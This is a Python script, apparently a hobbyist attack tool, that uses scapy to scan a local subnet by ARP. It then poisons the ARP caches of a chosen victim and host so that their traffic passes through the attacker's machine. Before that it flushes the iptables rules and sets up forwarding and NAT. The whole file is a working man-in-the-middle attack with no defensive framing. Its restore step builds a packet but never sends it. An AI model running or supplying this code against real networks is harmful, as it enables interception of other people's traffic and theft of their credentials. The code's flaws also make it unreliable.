import scapy.all as scapy
import subprocess
import re
import time
import os

def choose_iface_ip():
    choose_ip = {}
    avaliable_ifaces = re.findall(r'\w+: ',str(subprocess.run(['ifconfig'], stdout = subprocess.PIPE)))
    avaliable_ip = re.findall(r'inet\s\d{3}.\d+.\d+.',str(subprocess.run(['ifconfig'], stdout = subprocess.PIPE)))
    for i in range(len(avaliable_ifaces)):
        if avaliable_ifaces[i][0]=='n':
            avaliable_ifaces[i] = avaliable_ifaces[i][1:]

    for i in range(len(avaliable_ifaces)):
        choose_ip[avaliable_ifaces[i].replace(': ', '')]=avaliable_ip[i].replace('inet ', '') + '1/24'
    return choose_ip


def scan(ip):
    arp = scapy.ARP(op=1, pdst=ip)
    ether = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    result = scapy.srp(ether/arp, timeout=1, inter=0.1, verbose=0)[0]
    clients={}
    for sent, received in result:
        clients.update({received.psrc : received.hwsrc})
    return clients

def spoof(victim_ip,host_ip):
        pkt = scapy.ARP(op=2,pdst=victim_ip, hwdst=scan[victim_ip], psrc=host_ip)
        scapy.send(pkt, verbose=False)


def restore(victim_ip, host_ip):
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=scan[victim_ip], psrc=host_ip, hwsrc=scan[host_ip])


def iptables(iface):
    os.system('/sbin/iptables --flush')
    os.system('/sbin/iptables -t nat --flush')
    os.system('/sbin/iptables --zero')
    os.system('/sbin/iptables -A FORWARD --in-interface ' +  iface + ' -j ACCEPT')
    os.system('/sbin/iptables -t nat --append POSTROUTING --out-interface ' + iface + ' -j MASQUERADE')


print('Choose one:')
for i in choose_iface_ip().items():
    iface, ip = i
    print("{:<20} {:<15}".format(iface, ip))

iface1 = str(input())

scan = scan(choose_iface_ip()[iface1])
print("{:<20} {:<15}".format('IP','MAC'))
for i in scan.items():
    ip, mac = i
    print("{:<20} {:<15}".format(ip, mac))

iptables(iface1)

print('Choose victim ip:')
victim_ip = str(input())
print('Choose host ip:')
host_ip = str(input())



try:
    while True:
        spoof(victim_ip,host_ip)
        spoof(host_ip, victim_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print('Restoring')
    restore(victim_ip, host_ip)
    restore(host_ip, victim_ip)
